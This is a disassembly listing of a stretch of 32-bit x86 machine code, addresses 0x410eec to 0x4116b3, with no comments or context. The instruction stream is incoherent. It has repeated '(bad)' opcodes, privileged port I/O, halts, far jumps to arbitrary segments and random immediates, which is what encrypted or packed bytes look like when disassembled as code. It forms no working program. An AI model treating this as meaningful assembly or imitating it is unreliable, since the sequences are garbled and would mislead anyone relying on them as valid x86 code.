  410eec:	shl    BYTE PTR [edi+0x1dd5095],1
  410ef2:	popf   
  410ef3:	or     BYTE PTR [edi],bh
  410ef5:	repnz ds sub bl,ch
  410ef9:	adc    al,0x47
  410efb:	pop    esi
  410efc:	lea    eax,[esi]
  410efe:	(bad)  
  410eff:	xlat   BYTE PTR ds:[ebx]
  410f00:	inc    esi
  410f01:	mov    esi,0xce5c8af2
  410f06:	inc    edi
  410f07:	push   es
  410f08:	xchg   ebx,eax
  410f09:	stc    
  410f0a:	mov    dh,BYTE PTR [edi]
  410f0c:	cwde   
  410f0d:	ins    DWORD PTR es:[edi],dx
  410f0e:	pusha  
  410f0f:	pop    es
  410f10:	cmp    DWORD PTR [ecx],edx
  410f12:	sbb    esp,DWORD PTR [esi]
  410f14:	mov    edx,0x43b51059
  410f19:	inc    esi
  410f1a:	push   ebx
  410f1b:	jecxz  0x410f4c
  410f1d:	lods   al,BYTE PTR ds:[esi]
  410f1e:	ror    BYTE PTR [ecx-0x1fda9888],1
  410f24:	lahf   
  410f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f26:	adc    BYTE PTR [ebp+0x76],cl
  410f29:	mov    ebx,0x3cfa7c05
  410f2e:	js     0x410edf
  410f30:	jne    0x410f55
  410f32:	ret    0xb7b9
  410f35:	jecxz  0x410ee6
  410f37:	(bad)  
  410f38:	pop    esi
  410f39:	cli    
  410f3a:	es dec esi
  410f3c:	fmul   DWORD PTR [esi]
  410f3e:	or     al,0xa5
  410f40:	ds repnz push ecx
  410f43:	xor    al,0x39
  410f45:	inc    ecx
  410f46:	mov    dh,cl
  410f48:	inc    ebp
  410f49:	mov    eax,0x2c6e9b68
  410f4e:	adc    DWORD PTR [edx+0x59],esp
  410f51:	(bad)  
  410f52:	sbb    eax,0xb77dd7cd
  410f57:	cmp    DWORD PTR [esi],esp
  410f59:	lods   al,BYTE PTR ds:[esi]
  410f5a:	bound  ebx,QWORD PTR [ebx]
  410f5c:	mov    eax,0x91da5ead
  410f61:	cmp    BYTE PTR [eax+ecx*4],ch
  410f64:	jle    0x410f22
  410f66:	(bad)  
  410f67:	pop    ebp
  410f68:	cmp    DWORD PTR [esi],0xfba48a27
  410f6e:	push   ecx
  410f6f:	and    eax,0x90d68e94
  410f74:	ins    DWORD PTR es:[edi],dx
  410f75:	(bad)  
  410f76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f77:	inc    edi
  410f78:	and    ebx,ebx
  410f7a:	push   ss
  410f7b:	(bad)  
  410f7c:	cmc    
  410f7d:	test   ebx,esp
  410f7f:	aaa    
  410f80:	lea    esp,[esi+eax*2]
  410f83:	imul   ebx,DWORD PTR [edx+0x5c],0xcf8f33d9
  410f8a:	rol    DWORD PTR [eax+0x8],0xfc
  410f8e:	mov    bl,0xd5
  410f90:	push   0xffffff9a
  410f92:	pop    eax
  410f93:	cli    
  410f94:	ret    
  410f95:	test   bl,ah
  410f97:	adc    dl,dl
  410f99:	call   0x3dd0cac4
  410f9e:	and    eax,0xfce83ec1
  410fa3:	pop    edx
  410fa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fa5:	out    0x14,eax
  410fa7:	stc    
  410fa8:	in     al,dx
  410fa9:	mov    ecx,esp
  410fab:	pop    ebx
  410fac:	add    eax,ebx
  410fae:	xor    ebp,DWORD PTR [ebx-0x26]
  410fb1:	pop    esp
  410fb2:	pop    ss
  410fb3:	jg     0x41101d
  410fb5:	inc    edi
  410fb6:	loope  0x410f6d
  410fb8:	xchg   edx,eax
  410fb9:	cmp    BYTE PTR [ecx],bh
  410fbb:	push   ds
  410fbc:	les    edi,FWORD PTR [eax+0x37]
  410fbf:	test   eax,0xb3186bc1
  410fc4:	scas   al,BYTE PTR es:[edi]
  410fc5:	retf   
  410fc6:	adc    ebx,DWORD PTR [ecx+0x26]
  410fc9:	xor    eax,0xe4cd8d9
  410fce:	adc    dl,BYTE PTR [ebx]
  410fd0:	jae    0x410f72
  410fd2:	mov    bh,bl
  410fd4:	or     DWORD PTR [edx+0x6c],0x9000fca
  410fdb:	and    al,0xc0
  410fdd:	fsubr  QWORD PTR [esi+edi*4]
  410fe0:	out    dx,al
  410fe1:	xchg   ebp,eax
  410fe2:	daa    
  410fe3:	mov    edx,0xcfc94df3
  410fe8:	adc    DWORD PTR [eax],esp
  410fea:	xchg   DWORD PTR ds:0xc6347221,ecx
  410ff0:	and    ebp,eax
  410ff2:	sbb    eax,0xc2345ef7
  410ff7:	push   esi
  410ff8:	push   es
  410ff9:	aam    0x29
  410ffb:	add    eax,0xbb0ab97c
  411000:	cmp    dh,bh
  411002:	loopne 0x410faf
  411004:	inc    esp
  411005:	aam    0xf6
  411007:	data16 in al,dx
  411009:	in     eax,dx
  41100a:	inc    DWORD PTR [esi]
  41100c:	jecxz  0x410fec
  41100e:	loopne 0x410fb8
  411010:	ficomp WORD PTR [edi]
  411012:	dec    ebx
  411013:	scas   eax,DWORD PTR es:[edi]
  411014:	test   eax,0xc283b86e
  411019:	bound  ebx,QWORD PTR [edi-0x27]
  41101c:	lods   al,BYTE PTR ds:[esi]
  41101d:	pop    ebp
  41101e:	jl     0x411065
  411020:	dec    ebp
  411021:	or     BYTE PTR [eax-0x4fa00e11],dl
  411027:	(bad)  
  411029:	imul   ecx,DWORD PTR ds:0x5ed88b97,0x4e
  411030:	imul   ebx,DWORD PTR [edi+ecx*8+0x78],0xffffffef
  411035:	add    BYTE PTR [esi+0x63051e0d],0x25
  41103c:	and    bl,bl
  41103e:	mov    BYTE PTR [ebp+0x594d1937],ch
  411044:	bound  esp,QWORD PTR [edi+0x69]
  411047:	les    ebx,FWORD PTR cs:[eax+0xa2b7e6c]
  41104e:	mov    ebx,0xcc9e8777
  411053:	adc    al,bh
  411055:	leave  
  411056:	outs   dx,DWORD PTR ds:[esi]
  411057:	or     cl,BYTE PTR [edi-0x523543c4]
  41105d:	xchg   esp,eax
  41105e:	daa    
  41105f:	aad    0x78
  411061:	loop   0x410fed
  411063:	jge    0x4110bd
  411065:	jno    0x4110b7
  411067:	ror    ebp,1
  411069:	int    0x25
  41106b:	gs mov ah,0x3c
  41106e:	pop    ss
  41106f:	or     al,0x46
  411071:	push   DWORD PTR ds:0x5bf8da25
  411077:	add    BYTE PTR [edi+esi*4-0x46],ah
  41107b:	popf   
  41107c:	loop   0x4110ce
  41107e:	ret    0x790d
  411081:	stos   DWORD PTR es:[edi],eax
  411082:	sbb    al,0x63
  411084:	jmp    0xd0d2:0x7ca06bd8
  41108b:	adc    eax,0x26870e16
  411090:	aas    
  411091:	shl    DWORD PTR [ebx-0x76a842b0],cl
  411097:	jge    0x411031
  411099:	icebp  
  41109a:	cmc    
  41109b:	push   cs
  41109c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41109d:	sub    ecx,esi
  41109f:	cli    
  4110a0:	lahf   
  4110a1:	call   DWORD PTR [ebp-0x13dd637c]
  4110a7:	jl     0x411125
  4110a9:	or     eax,0xae44b0c6
  4110ae:	and    eax,0x42834e42
  4110b3:	or     DWORD PTR [edi],eax
  4110b5:	push   eax
  4110b6:	(bad)  
  4110ba:	aam    0x3b
  4110bc:	xor    al,bh
  4110be:	cmp    dl,BYTE PTR es:[ebp+0xe]
  4110c2:	mov    ds:0xffb8d0f3,eax
  4110c7:	in     eax,dx
  4110c8:	or     ebx,ebp
  4110ca:	jmp    0xe839:0xdea196de
  4110d1:	ds inc eax
  4110d3:	push   cs
  4110d4:	or     DWORD PTR [ecx+0xc],0xffffffa7
  4110d8:	jne    0x4110e8
  4110da:	jg     0x411140
  4110dc:	xlat   BYTE PTR ds:[ebx]
  4110dd:	xchg   ebx,eax
  4110de:	jp     0x4110a5
  4110e0:	loopne 0x41110f
  4110e2:	rcr    BYTE PTR [ebp-0x77],cl
  4110e5:	cmp    al,0x3b
  4110e7:	mov    ch,0x74
  4110e9:	mov    al,0x18
  4110eb:	mov    dl,BYTE PTR [eax-0x43]
  4110ee:	das    
  4110ef:	xchg   ebx,eax
  4110f0:	aas    
  4110f1:	mov    al,0x8
  4110f3:	jle    0x4110f7
  4110f5:	xlat   BYTE PTR ds:[ebx]
  4110f6:	leave  
  4110f7:	inc    ecx
  4110f8:	pushf  
  4110f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110fa:	je     0x411132
  4110fc:	sbb    ah,BYTE PTR [ecx]
  4110fe:	push   cs
  4110ff:	(bad)  
  411100:	jle    0x41112e
  411102:	inc    esp
  411103:	imul   ebx,DWORD PTR [ebp-0x6c],0x38
  411107:	inc    esp
  411108:	ins    BYTE PTR es:[edi],dx
  411109:	pop    esp
  41110a:	repz inc edi
  41110c:	add    DWORD PTR [ebx],0xffffffa6
  41110f:	adc    al,0xa
  411111:	add    eax,0xd973ee0b
  411116:	call   0xbad00b89
  41111b:	iret   
  41111c:	mov    ecx,0xc2cc97e5
  411121:	dec    ebp
  411122:	adc    cl,BYTE PTR [eax+0x77]
  411125:	lods   al,BYTE PTR ds:[esi]
  411126:	jecxz  0x4110ca
  411128:	mov    eax,ds:0xac5b833b
  41112d:	out    0x3c,al
  41112f:	push   ecx
  411130:	call   0xd945:0xf37eddee
  411137:	outs   dx,DWORD PTR ds:[esi]
  411138:	fiadd  DWORD PTR [eax+0x3f]
  41113b:	mov    al,ds:0x86395924
  411140:	jg     0x4110d9
  411142:	repnz mov bh,0x8a
  411145:	and    esi,DWORD PTR [ecx]
  411147:	mov    ebp,0xb438fa5a
  41114c:	test   al,0xa7
  41114e:	dec    ecx
  41114f:	xchg   ebp,eax
  411150:	and    edi,DWORD PTR [ecx+0x6bdbc53a]
  411156:	out    0x72,eax
  411158:	fwait
  411159:	hlt    
  41115a:	(bad)  
  41115c:	and    eax,0x165b07fd
  411161:	sbb    DWORD PTR [ecx],esp
  411163:	repz test al,0xf5
  411166:	cmp    al,0xd1
  411168:	test   al,0xf9
  41116a:	fdiv   st(0),st
  41116c:	fs inc ebp
  41116e:	icebp  
  41116f:	pop    bx
  411171:	stos   BYTE PTR es:[edi],al
  411172:	lods   al,BYTE PTR ds:[esi]
  411173:	sar    BYTE PTR [ecx],1
  411175:	jno    0x4111dc
  411177:	mov    esi,0xe610908d
  41117c:	mov    esi,0xde09bcde
  411181:	fs adc al,0x4
  411184:	shr    DWORD PTR [edx-0x4179b930],1
  41118a:	pop    edi
  41118b:	or     al,0x84
  41118d:	or     DWORD PTR [ecx+ebx*4+0x77],ebp
  411191:	cmc    
  411192:	imul   esi,DWORD PTR [edi+eax*8+0x2],0x662d22de
  41119a:	pushf  
  41119b:	lock test al,0x56
  41119e:	jnp    0x4111cb
  4111a0:	mov    esi,0xabf0bfd6
  4111a5:	push   0x37025e13
  4111aa:	push   esp
  4111ab:	retf   
  4111ac:	xchg   edx,eax
  4111ad:	xor    ebp,DWORD PTR [eax+0x8]
  4111b0:	xor    edi,DWORD PTR [esi+0x3d]
  4111b3:	or     eax,0xc2cfda39
  4111b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111b9:	stos   BYTE PTR es:[edi],al
  4111ba:	add    DWORD PTR [esp+edx*2+0x21],eax
  4111be:	aam    0x31
  4111c0:	lds    esi,FWORD PTR [edx-0x5e]
  4111c3:	clc    
  4111c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111c5:	in     eax,0x23
  4111c7:	inc    ecx
  4111c8:	sbb    al,0xb3
  4111ca:	dec    edx
  4111cb:	mov    edx,0xdc0c887e
  4111d0:	pushf  
  4111d1:	mov    esp,0xcef3d5cb
  4111d6:	sbb    BYTE PTR ds:0x9b849b23,bl
  4111dc:	jmp    0x411180
  4111de:	fidiv  DWORD PTR [edx-0x40f1ddc9]
  4111e4:	inc    edx
  4111e5:	push   eax
  4111e6:	mov    cl,0xd2
  4111e8:	test   al,0x5
  4111ea:	sub    al,0x46
  4111ec:	adc    eax,0x2700323f
  4111f1:	add    eax,DWORD PTR [ebx]
  4111f3:	sub    eax,0x140dc064
  4111f8:	dec    edx
  4111f9:	pushf  
  4111fa:	xor    BYTE PTR [edi-0x284390fe],bh
  411200:	hlt    
  411201:	daa    
  411202:	xor    BYTE PTR [ecx+0x19],0x5b
  411206:	mov    esp,0x8a2b26ab
  41120b:	jnp    0x4111a4
  41120d:	xor    ebx,0xffffffeb
  411210:	jns    0x4111c4
  411212:	pop    ds
  411213:	adc    eax,0x7bb73acd
  411218:	iret   
  411219:	lahf   
  41121a:	mov    ebp,0x39ff9eb2
  41121f:	clc    
  411220:	call   0x1c673d4
  411225:	sub    BYTE PTR [ecx+0x567c78d8],dl
  41122b:	dec    esi
  41122c:	jp     0x411280
  41122e:	ret    0xfbae
  411231:	push   0x74b0c532
  411236:	cdq    
  411237:	mov    esi,edi
  411239:	push   ebx
  41123a:	pop    ds
  41123b:	xchg   esp,eax
  41123c:	xchg   ecx,eax
  41123d:	xchg   ebp,eax
  41123e:	ror    ah,1
  411240:	(bad)  
  411241:	arpl   WORD PTR [edx+edx*1-0x62449103],si
  411248:	mov    dl,0x29
  41124a:	add    al,0x1c
  41124c:	daa    
  41124d:	ds cmp bl,ch
  411250:	loope  0x4112b4
  411252:	int    0x6f
  411254:	sbb    BYTE PTR [eax+0x1b5948f2],al
  41125a:	shl    edx,1
  41125c:	push   esi
  41125d:	xor    al,0xfa
  41125f:	push   ebp
  411260:	ins    DWORD PTR es:[edi],dx
  411261:	push   ecx
  411262:	jl     0x4112cb
  411264:	jle    0x41125e
  411266:	jns    0x4112b8
  411268:	mov    edx,0x75eb1ff2
  41126d:	xchg   esi,eax
  41126e:	pop    edx
  41126f:	sbb    DWORD PTR [esi-0x20],0x5fda35b4
  411276:	stos   BYTE PTR es:[edi],al
  411277:	push   ds
  411278:	ret    
  411279:	popf   
  41127a:	fadd   st(1),st
  41127c:	(bad)  
  41127d:	das    
  41127e:	jmp    0xb594:0x79a3f7b9
  411285:	je     0x4112dd
  411287:	test   eax,0x8edd63e6
  41128c:	cli    
  41128d:	test   edi,eax
  41128f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411290:	add    DWORD PTR [ecx-0x28362ce6],0x52
  411297:	loope  0x411250
  411299:	hlt    
  41129a:	push   esp
  41129b:	ret    
  41129c:	test   eax,0x40246072
  4112a1:	ins    DWORD PTR es:[edi],dx
  4112a2:	shl    BYTE PTR [edi+ebx*1+0x7af75ef],1
  4112a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112aa:	adc    ch,ch
  4112ac:	popf   
  4112ad:	imul   esp,DWORD PTR [edx-0x66a2ec3e],0xf6e5d881
  4112b7:	sub    ch,BYTE PTR [ebx+0x4b6dfe0f]
  4112bd:	sub    ecx,DWORD PTR [edi-0x51e173f]
  4112c3:	aaa    
  4112c4:	icebp  
  4112c5:	fsubrp st(6),st
  4112c7:	ins    DWORD PTR es:[edi],dx
  4112c8:	icebp  
  4112c9:	adc    bh,bl
  4112cb:	mov    ds:0x673e16af,eax
  4112d0:	mov    ds:0xa4a127df,al
  4112d5:	mov    ds:0x23b19b29,al
  4112da:	loopne 0x411303
  4112dc:	cdq    
  4112dd:	adc    al,0x83
  4112df:	leave  
  4112e0:	popf   
  4112e1:	or     edx,eax
  4112e3:	inc    edx
  4112e4:	inc    ebp
  4112e5:	das    
  4112e6:	ret    
  4112e7:	jo     0x4112e3
  4112e9:	cwde   
  4112ea:	mov    bx,WORD PTR [ecx]
  4112ed:	pop    ss
  4112ee:	cli    
  4112ef:	ror    ecx,cl
  4112f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112f2:	jmp    0x84d3a01
  4112f7:	dec    esi
  4112f8:	(bad)  
  4112f9:	xchg   esi,eax
  4112fa:	sbb    ah,BYTE PTR [edx+edi*1-0x3518278]
  411301:	jmp    0x4f15:0x6c7c962b
  411308:	outs   dx,DWORD PTR ds:[esi]
  411309:	push   ebx
  41130a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41130b:	sti    
  41130c:	fimul  DWORD PTR [edx+0x51336b71]
  411312:	(bad)  
  411313:	gs ffree st(3)
  411316:	mov    BYTE PTR [ebx+0x6a],ah
  411319:	or     BYTE PTR [edx-0x1baba64],cl
  41131f:	loope  0x41133d
  411321:	xor    DWORD PTR [ecx],ecx
  411323:	xlat   BYTE PTR ds:[ebx]
  411324:	iret   
  411325:	push   ebx
  411326:	pusha  
  411327:	push   edx
  411328:	or     ah,ah
  41132a:	and    al,0xb2
  41132c:	hlt    
  41132d:	push   ds
  41132e:	and    eax,0xd593eaeb
  411333:	or     DWORD PTR [edi-0x6a],0x21faef3b
  41133a:	shl    BYTE PTR ds:0xc81d3f4d,0x96
  411341:	adc    al,0x94
  411343:	(bad)  
  411344:	mov    cl,0x36
  411346:	icebp  
  411347:	xchg   ebp,eax
  411348:	xlat   BYTE PTR ds:[ebx]
  411349:	popa   
  41134a:	lock rcr esi,0xfc
  41134e:	ja     0x411392
  411350:	xor    DWORD PTR [eax-0x2f],esp
  411353:	push   ecx
  411354:	adc    al,0x3f
  411356:	adc    BYTE PTR ds:0x29ff185,bh
  41135c:	xlat   BYTE PTR ds:[ebx]
  41135d:	loop   0x41136e
  41135f:	out    dx,eax
  411360:	and    BYTE PTR [ecx],bl
  411362:	es pop ss
  411364:	repz xor edx,DWORD PTR [edi-0x74252e83]
  41136b:	pop    ebx
  41136c:	mov    es,WORD PTR [edx]
  41136e:	push   0xffffff9a
  411370:	or     dl,al
  411372:	rcr    DWORD PTR [edx+ecx*1+0x5111caa1],1
  411379:	pop    edi
  41137a:	jne    0x41139b
  41137c:	push   eax
  41137d:	jbe    0x411372
  41137f:	jbe    0x411364
  411381:	mov    esi,0x1229ede1
  411386:	jo     0x411400
  411388:	mov    ah,BYTE PTR [ebx+0x5f]
  41138b:	int    0x5d
  41138d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41138e:	cmp    BYTE PTR [eax+ebp*4+0x9ce06cc],ah
  411395:	add    DWORD PTR [ebx],esi
  411397:	push   ds
  411398:	ret    
  411399:	out    0xaa,eax
  41139b:	stc    
  41139c:	mov    bh,0x9b
  41139e:	push   es
  41139f:	ins    DWORD PTR es:[edi],dx
  4113a0:	push   esp
  4113a1:	jnp    0x41140e
  4113a3:	sbb    eax,0xecf64e8a
  4113a8:	or     BYTE PTR [edx+eax*2-0x20],ch
  4113ac:	inc    DWORD PTR gs:[edi-0x10174bf7]
  4113b3:	lods   eax,DWORD PTR ds:[esi]
  4113b4:	jge    0x4113d5
  4113b6:	aam    0x9a
  4113b8:	and    edx,ecx
  4113ba:	sub    dh,bl
  4113bc:	xchg   edi,eax
  4113bd:	fldenv [edx]
  4113bf:	jp     0x4113f4
  4113c1:	sub    DWORD PTR [ebp+0x79a92cb4],ebp
  4113c7:	cmp    eax,0xd8264d71
  4113cc:	mov    WORD PTR [eax+ecx*8],cs
  4113cf:	(bad)  
  4113d0:	push   esi
  4113d1:	sub    BYTE PTR [ebp+0x54b733a4],0x8e
  4113d8:	test   al,0x24
  4113da:	mov    cl,0x9a
  4113dc:	add    al,0xf0
  4113de:	lods   al,BYTE PTR ds:[esi]
  4113df:	mov    dl,0x65
  4113e1:	stos   BYTE PTR es:[edi],al
  4113e2:	jl     0x4113f6
  4113e4:	sbb    al,BYTE PTR [esi+0x60348d25]
  4113ea:	mov    al,ds:0xdece052d
  4113ef:	mov    al,ds:0x51a897a8
  4113f4:	dec    esi
  4113f5:	sbb    ecx,DWORD PTR [eax]
  4113f7:	fisttp QWORD PTR [edx-0xa]
  4113fa:	mov    ebp,0x63ab1c8
  4113ff:	shr    BYTE PTR [ebp-0x4315cef6],1
  411405:	call   0x4e74:0xaf447b20
  41140c:	or     ecx,DWORD PTR [ecx-0x61]
  41140f:	adc    dh,BYTE PTR [ebp-0x51]
  411412:	jbe    0x41140f
  411414:	call   0x2ed0c832
  411419:	sbb    al,0xc7
  41141b:	and    cl,BYTE PTR [edi+esi*8]
  41141e:	imul   eax,esi,0x5b673e11
  411424:	jmp    0x360a:0x14263e73
  41142b:	fsincos 
  41142d:	xlat   BYTE PTR ds:[ebx]
  41142e:	imul   ebx,DWORD PTR [ecx-0x3d106c5b],0xfffffff9
  411435:	push   ebx
  411436:	mov    eax,0xf10d2885
  41143b:	in     al,dx
  41143c:	pop    ebx
  41143d:	pop    eax
  41143e:	inc    ecx
  41143f:	fisubr DWORD PTR [edx+esi*1]
  411442:	inc    esp
  411443:	test   BYTE PTR [esi],cl
  411445:	push   edx
  411446:	push   ds
  411447:	push   eax
  411448:	jnp    0x41146e
  41144a:	sub    edx,edx
  41144c:	imul   esi,DWORD PTR [esi+eax*2],0x357054ac
  411453:	and    DWORD PTR [eax],eax
  411455:	(bad)  
  411456:	cli    
  411457:	jmp    0xee96:0x1c811f30
  41145e:	jle    0x411430
  411460:	inc    ebx
  411461:	lds    esi,FWORD PTR [ecx+ebp*4+0x9]
  411465:	in     eax,0x8c
  411467:	mov    edi,DWORD PTR [edi+0x58]
  41146a:	ja     0x4114c7
  41146c:	pop    ss
  41146d:	and    DWORD PTR [edx-0x8],esi
  411470:	out    0xde,al
  411472:	mov    esi,0x70d459f2
  411477:	jns    0x41149e
  411479:	clc    
  41147a:	and    eax,0xd97b182b
  41147f:	ins    DWORD PTR es:[edi],dx
  411480:	scas   al,BYTE PTR es:[edi]
  411481:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411483:	clc    
  411484:	mov    al,ds:0xa8b6fc02
  411489:	mov    eax,ds:0x9bd3dda9
  41148e:	mov    ebx,0xab500aeb
  411493:	arpl   WORD PTR [ebp-0x69],bx
  411496:	adc    ebp,DWORD PTR [eax+0x4bae378d]
  41149c:	iret   
  41149d:	mov    bl,0x96
  41149f:	pop    ebx
  4114a0:	pop    ebx
  4114a1:	or     BYTE PTR [eax+0x7b9731d0],ah
  4114a7:	(bad)  
  4114a8:	pop    ds
  4114a9:	loope  0x411431
  4114ab:	or     DWORD PTR [ebx+0x3a],ecx
  4114ae:	repz sub al,0xc8
  4114b1:	mov    WORD PTR [ebx+ebx*1],es
  4114b4:	inc    esp
  4114b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114b6:	test   eax,0x6867cb7
  4114bb:	mov    eax,ds:0xe43decf2
  4114c0:	(bad)  
  4114c1:	es sbb al,0x62
  4114c4:	pop    eax
  4114c5:	(bad)  
  4114c6:	fild   WORD PTR [esi-0x3950fc3b]
  4114cc:	push   ebx
  4114cd:	sbb    dh,BYTE PTR [eax-0x71]
  4114d0:	add    DWORD PTR [eax],ebp
  4114d2:	out    0xa8,eax
  4114d4:	lods   al,BYTE PTR ds:[esi]
  4114d5:	cs leave 
  4114d7:	nop
  4114d8:	ficom  WORD PTR [esi]
  4114da:	es stos DWORD PTR es:[edi],eax
  4114dc:	mov    cl,0x7f
  4114de:	jo     0x41155d
  4114e0:	mov    ds:0xf6943477,eax
  4114e5:	int3   
  4114e6:	test   cl,dl
  4114e8:	or     ch,bl
  4114ea:	add    DWORD PTR [edx],edx
  4114ec:	mov    gs,WORD PTR [ebp+0x5110dc83]
  4114f2:	inc    edi
  4114f3:	xor    al,0xbc
  4114f5:	rcl    DWORD PTR [ebx-0x5d5b8e13],0x2c
  4114fc:	jecxz  0x4114d6
  4114fe:	test   eax,0x941d2198
  411503:	pusha  
  411504:	test   DWORD PTR [eax+0x5c75e1c5],0xf76a592d
  41150e:	ficomp WORD PTR [ecx-0x373d788f]
  411514:	and    ecx,eax
  411516:	dec    edi
  411517:	xor    bl,al
  411519:	rcl    ch,1
  41151b:	and    DWORD PTR [edx+ebp*8-0x3b],ecx
  41151f:	sub    eax,0xba1cd93a
  411524:	add    DWORD PTR [esi],edi
  411526:	mov    esi,0x6e563154
  41152b:	mov    ebp,0x3d07d044
  411530:	lods   al,BYTE PTR ds:[esi]
  411531:	scas   eax,DWORD PTR es:[edi]
  411532:	sbb    al,0xad
  411534:	adc    cl,BYTE PTR [ecx-0x60]
  411537:	xchg   DWORD PTR es:[ebp-0x52],esp
  41153b:	and    edx,DWORD PTR [edx+0x5185012f]
  411541:	jae    0x4115c1
  411543:	push   ebp
  411544:	stos   BYTE PTR es:[edi],al
  411545:	ror    edx,cl
  411547:	test   eax,0xaab10b35
  41154c:	fsubr  QWORD PTR [ecx]
  41154e:	idiv   DWORD PTR [ecx]
  411550:	cld    
  411551:	sub    eax,DWORD PTR ds:0xd78c77b9
  411557:	hlt    
  411558:	push   edi
  411559:	dec    edx
  41155a:	shr    edx,cl
  41155c:	push   0xfffffff0
  41155e:	mov    dh,ah
  411560:	out    dx,eax
  411561:	das    
  411562:	mov    bh,0xfd
  411564:	pop    edx
  411565:	cmp    ah,BYTE PTR [eax+0x5e3c8b52]
  41156b:	cmp    eax,0x5c46166f
  411570:	jbe    0x41152c
  411572:	iret   
  411573:	ins    DWORD PTR es:[edi],dx
  411574:	(bad)  
  411575:	pop    ds
  411576:	jbe    0x41159d
  411578:	adc    al,0xe2
  41157a:	xor    al,0xcd
  41157c:	scas   eax,DWORD PTR es:[edi]
  41157d:	dec    ebp
  41157e:	sbb    eax,0x4c5763b
  411583:	and    DWORD PTR [ecx-0x4603d47e],ecx
  411589:	jbe    0x411596
  41158b:	push   es
  41158c:	adc    ch,dh
  41158e:	ror    DWORD PTR [edi+esi*4],cl
  411591:	mov    ds,WORD PTR [esi+0x1f263b07]
  411597:	mov    esi,?
  411599:	dec    ebp
  41159a:	adc    al,BYTE PTR [eax]
  41159c:	pop    esp
  41159d:	rcr    edx,0x56
  4115a0:	inc    edi
  4115a1:	cmp    eax,0x53824de8
  4115a6:	je     0x4115f8
  4115a8:	xchg   edx,eax
  4115a9:	jo     0x4115d8
  4115ab:	push   eax
  4115ac:	rcl    BYTE PTR [ebp-0x1906df17],cl
  4115b2:	aad    0x7c
  4115b4:	(bad)  
  4115b5:	push   ds
  4115b6:	and    eax,0x61224d5
  4115bb:	push   esi
  4115bc:	fisub  WORD PTR [edx+ebx*4]
  4115bf:	sub    ecx,edx
  4115c1:	mov    esp,0x141c0dd0
  4115c6:	dec    esp
  4115c7:	ror    ah,1
  4115c9:	cld    
  4115ca:	dec    ebx
  4115cb:	stos   BYTE PTR es:[edi],al
  4115cc:	mov    DWORD PTR [ebx+ebx*1+0x19946566],esi
  4115d3:	adc    DWORD PTR [edi-0x74],edx
  4115d6:	int3   
  4115d7:	gs add dh,bh
  4115da:	lds    ebp,FWORD PTR [esi+0x7dd0b32]
  4115e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115e1:	gs int 0xd6
  4115e4:	(bad)  
  4115e5:	ret    
  4115e6:	xchg   ebp,eax
  4115e7:	das    
  4115e8:	sbb    esp,esi
  4115ea:	mov    ebx,0x484212b1
  4115ef:	rcl    ecx,cl
  4115f1:	retf   0x9fc8
  4115f4:	mov    ebx,DWORD PTR [ebx-0x7465a7eb]
  4115fa:	bound  ebx,QWORD PTR ds:0x105744a5
  411600:	repz xor esp,DWORD PTR [ebx+ebx*2-0x54]
  411605:	and    eax,0xd6e8b49f
  41160a:	mov    WORD PTR [eax*8-0x17e1bd05],fs
  411611:	fcomp  QWORD PTR [esi+0x4]
  411614:	lock ds das 
  411617:	mov    eax,DWORD PTR [eax]
  411619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41161a:	jg     0x4115da
  41161c:	aam    0x7d
  41161e:	or     ebx,edi
  411620:	inc    esi
  411621:	or     BYTE PTR [edi+0x55],ah
  411624:	js     0x411667
  411626:	scas   al,BYTE PTR es:[edi]
  411627:	(bad)  
  411628:	mov    ch,0x3e
  41162a:	mov    dh,0xa8
  41162c:	cli    
  41162d:	hlt    
  41162e:	hlt    
  41162f:	cmp    eax,0x7c2a597e
  411634:	fisub  DWORD PTR [eax+edx*1+0x290552a0]
  41163b:	retf   0xa812
  41163e:	shr    BYTE PTR [ebx],0x74
  411641:	pop    ecx
  411642:	xchg   edi,eax
  411643:	mov    esp,0x89d4b94c
  411648:	scas   al,BYTE PTR es:[edi]
  411649:	inc    esp
  41164a:	adc    esi,esi
  41164c:	imul   esp,eax,0x7f
  41164f:	(bad)  
  411650:	pop    esi
  411651:	adc    eax,0xedaad9c2
  411656:	lods   eax,DWORD PTR ds:[esi]
  411657:	pop    esi
  411658:	xor    BYTE PTR [eax+0x24],al
  41165b:	add    ebx,DWORD PTR [edi-0x45955857]
  411661:	js     0x411621
  411663:	stos   DWORD PTR es:[edi],eax
  411664:	and    al,0x68
  411666:	push   ds
  411667:	adc    BYTE PTR [esi],0x2e
  41166a:	fnclex 
  41166c:	aaa    
  41166d:	cmp    ecx,DWORD PTR [ebx]
  41166f:	and    eax,0xa41144f
  411674:	lock imul eax,DWORD PTR [edi+0x3729f2e6],0x62
  41167c:	aaa    
  41167d:	adc    BYTE PTR [eax+0x7eeecc77],0x33
  411684:	xlat   BYTE PTR ds:[ebx]
  411685:	outs   dx,BYTE PTR ds:[esi]
  411686:	sbb    al,0x47
  411688:	and    BYTE PTR [edx+ecx*2],0xdf
  41168c:	leave  
  41168d:	adc    BYTE PTR [edx+0x37eaae5d],dl
  411693:	or     al,0xad
  411695:	loop   0x4116dd
  411697:	sbb    DWORD PTR [ecx-0x23b369bb],edi
  41169d:	sub    al,0x59
  41169f:	sub    DWORD PTR [ebx],ecx
  4116a1:	jnp    0x4116b4
  4116a3:	sar    DWORD PTR [ebx+esi*4+0x7cfa886a],1
  4116aa:	xchg   edi,eax
  4116ab:	sbb    bh,bl
  4116ad:	arpl   WORD PTR [ebp+0x73],bx
  4116b0:	xchg   DWORD PTR [edi+edi*4],ecx
  4116b3:	mov    dl,0x42
